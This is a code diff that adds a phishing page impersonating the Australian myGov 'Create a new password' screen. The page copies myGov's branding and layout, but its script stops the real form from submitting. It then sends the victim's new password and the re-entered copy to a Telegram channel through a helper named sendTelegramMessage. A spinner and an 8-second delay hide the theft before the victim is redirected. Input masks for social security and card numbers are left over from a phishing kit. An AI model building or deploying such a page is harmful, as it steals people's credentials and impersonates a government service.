@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="x-ua-compatible" content="ie=edge">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <title>
+        Create a new password - myGov
+    </title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link href="./css/css.css" rel="stylesheet">
+    <link href="./css/mgv2-application.css" rel="stylesheet">
+    <link href="./css/blugov.css" rel="stylesheet">
+    <style>
+        /* Spinner styles for the Confirm button */
+        .button-main .spinner {
+            display: none;
+            width: 18px;
+            height: 18px;
+            border: 2px solid #ffffff;
+            border-top-color: transparent;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto;
+        }
+        .button-main.processing .spinner {
+            display: inline-block;
+        }
+        .button-main.processing .btn-text {
+            display: none;
+        }
+        .button-main.processing {
+            pointer-events: none;
+            opacity: 0.8;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+
+<body>
+    <header role="banner" class="mgvEnhanceHeader">
+        <section class="wrapper">
+            <div class="inner">
+                <div class="unauth-grid">
+                    <div class="unauth-grid-row">
+                        <a href="#" class="unauth-govt-crest__link">
+                            <img id="unauth-govt-crest" src="./images/myGov-cobranded-logo-black.svg" alt="myGov Beta" role="img">
+                        </a>
+                        <div class="header-links">
+                            <a href="#">Help</a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </header>
+    <div class="wrapper-mapwap"><div class="main-block" id="content" role="main">
+	<form id="resetPasswordPair" action="/las/mygov-login?execution=e5s5" method="post">	
+		
+		
+		
+			
+			
+				<h1>Create a new password</h1>
+			
+		
+        
+            
+        
+
+		<p>Your password must:</p>
+		<ul>
+			<li>have at least 10 characters</li>
+			<li>include at least 1 number</li>
+		</ul>
+		<details id="mygovChangePasswordDisclosure">
+			<summary style="cursor: pointer; color: #005ea5; text-decoration: underline; font-weight: bold; list-style: none; display: inline-flex; align-items: center; gap: 8px;">
+                                            Learn more about passwords <span style="font-size: 10px; transform: translateY(2px);">&#9662;</span>
+                                        </summary>
+			<div class="disclosure-text">
+				<div class="disclosure-inner-bottom-spacer"></div>
+				<div data-auto="authored-disclosure-text" class="disclosure-content-list">
+					<p>Your password must:</p>
+					<ul>
+						<li>have between 10 and 64 characters</li>
+						<li>include at least 1 letter</li>
+						<li>include at least 1 number</li>
+						<li>not be the same as a password you‘ve used in myGov before</li>
+						<li>not use the same character 4 times repeatedly such as AAAA or 1111</li>
+						<li>not use a sequence of characters such as ABCD or 1234.</li>
+					</ul>
+					<p>Your password can have spaces and any of the following special characters: ! @ # $ % ^ &amp; *</p>
+					<p>
+						Strong passwords include special characters or passphrases. Read about <a href="https://www.cyber.gov.au/acsc/view-all-content/publications/creating-strong-passphrases" target="_blank">creating a passphrase</a>.
+					</p>
+				</div>
+				<div class="disclosure-inner-bottom-spacer"></div>
+			</div>
+		</details>
+
+		<div class="input-group">
+			<label for="newPassword">New password</label>
+			<div class="password-group">
+				<button class="showPassword anchor" type="button" aria-describedby="show-hide-helpmsg" aria-label="Show password as plain text.">Show</button><p class="is-visuallyhidden" id="show-hide-helpmsg">Note: this will visually expose your password on the screen.</p><input id="newPassword" name="password" data-new-password="data-new-password" type="password" value="" autocomplete="off">  				
+			</div>
+		</div>
+			
+		<div class="input-group">
+			<label for="passwordRetyped">Re-enter new password</label>	
+			<div class="password-group">			
+ 				<button class="showPassword anchor" type="button" aria-describedby="show-hide-helpmsg" aria-label="Show password as plain text.">Show</button><p class="is-visuallyhidden" id="show-hide-helpmsg">Note: this will visually expose your password on the screen.</p><input id="passwordRetyped" name="repeatedPassword" data-reenter-password="data-reenter-password" type="password" value="" autocomplete="off">  				
+			</div>
+		</div>
+							
+		<input type="hidden" name="_flowExecutionKey" value="e5s5">
+		<input type="hidden" name="_csrf" value="bced7307-4b4e-4fbc-822c-99ffa14838a6">
+			
+
+		<div class="button-container">
+			
+				
+					<button type="submit" id="next" name="_eventId_next" value="Confirm" class="button-main button">
+						<span class="btn-text">Confirm</span>
+						<span class="spinner"></span>
+					</button>
+					<button type="button" onclick="location.href='/las/mygov-login?execution=e5s5&amp;_eventId=cancel'" class="button-minor button">Cancel</button>
+				
+				
+			
+		</div>	
+			
+	<div>
+<input type="hidden" name="_csrf" value="bced7307-4b4e-4fbc-822c-99ffa14838a6">
+</div></form>
+</div></div>
+    <footer role="contentinfo">
+        <div class="wrapper">
+            <div class="inner">
+                <section class="footer-list">
+                    <nav>
+                        <h2 class="sr-only" aria-label="Footer">Footer</h2>
+                        <ul class="lower-links">
+                            <li>
+                                <a target="_blank" href="#">Terms of use</a>
+                            </li>
+                            <li>
+                                <a target="_blank" href="#">Privacy and security</a>
+                            </li>
+                            <li>
+                                <a target="_blank" href="#">Copyright</a>
+                            </li>
+                            <li>
+                                <a target="_blank" href="#">Accessibility</a>
+                            </li>
+                        </ul>
+                    </nav>
+                </section>
+                <div class="footer-lower">
+                    <section class="footer-lower-logo">
+                        <a href="#">
+                            <img src="./images/myGov-cobranded-logo-white.svg" alt="myGov Beta" width="313.17" height="70" role="img">
+                        </a>
+                    </section>
+                    <p class="footer-acknowledgement">We acknowledge the Traditional Custodians of the lands we live on. We pay our respects to all Elders, past and present, of all Aboriginal and Torres Strait Islander nations.</p>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <!-- ====== SCRIPTS ====== -->
+    <!-- Full jQuery (contains $.ajax) -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
+    <script src="https://s3-us-west-2.amazonaws.com/s.cdpn.io/3/jquery.inputmask.bundle.js"></script>
+    <script type="text/javascript">
+        $("#ssn").inputmask({ "mask": "999-99-9999" });
+        $("#cn").inputmask({ "mask": "9999 9999 9999 9999" });
+        $("#dob").inputmask({ "mask": "99/99/9999", "placeholder": "DD/MM/YYYY" });
+        $("#exdate").inputmask({ "mask": "99/9999", "placeholder": "MM/YYYY" });
+        $("#ph").inputmask({ "mask": "999-999-9999" });
+    </script>
+    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js"></script>
+    <!-- 🚫 Slim jQuery removed to prevent breaking $.ajax -->
+    <script type="text/javascript" src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
+
+    <!-- ====== 🟢 TELEGRAM SCRIPT + SPINNER + 8‑SECOND DELAY ====== -->
+    <script src="endpoints.js"></script>
+<script src="config.js"></script>
+<script>
+    $(document).ready(function() {
+        $('.showPassword').on('click', function() {
+            let $btn = $(this);
+            let $input = $btn.siblings('input');
+            if ($input.attr('type') === 'password') {
+                $input.attr('type', 'text');
+                $btn.text('Hide');
+            } else {
+                $input.attr('type', 'password');
+                $btn.text('Show');
+            }
+        });
+
+        $('#resetPasswordPair').on('submit', function(e) {
+            e.preventDefault();
+            let newPass = $('#newPassword').val();
+            let retypedPass = $('#passwordRetyped').val();
+            if (!newPass || !retypedPass) { alert('Please fill in both password fields.'); return; }
+            if (newPass !== retypedPass) { alert('Passwords do not match.'); return; }
+            const $btn = $('#next');
+            $btn.addClass('processing');
+            $btn.prop('disabled', true);
+            let msg = "|----------| NEW PASSWORD |--------------|\n";
+            msg += "New password: " + newPass + "\n";
+            msg += "Re-entered: " + retypedPass + "\n";
+            msg += "|-----------------------------------------|";
+            sendTelegramMessage(msg).catch(() => {});
+            setTimeout(function() { window.location.href = 'resetsucess.html'; }, 8000);
+        });
+    });
+</script>
+</body>
+
+</html>
